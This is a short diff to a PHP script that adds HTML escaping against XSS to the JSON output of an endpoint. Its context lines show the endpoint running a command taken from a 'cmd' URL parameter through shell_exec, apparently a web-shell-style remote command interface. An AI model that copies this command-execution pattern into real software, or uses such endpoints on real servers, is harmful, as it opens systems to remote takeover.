@@ -31,6 +31,9 @@ if (isset($_GET["cmd"])) {
         $ret = shell_exec($cmd);
     }
 
+    // Remove any HTML that could be used for XSS attacks
+    $ret = htmlentities($ret, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+    $msg = htmlentities($msg, ENT_QUOTES | ENT_HTML5, 'UTF-8');
     echo json_encode(array("rsp"=>$ret, "msg" => $msg));
 }
 ?>
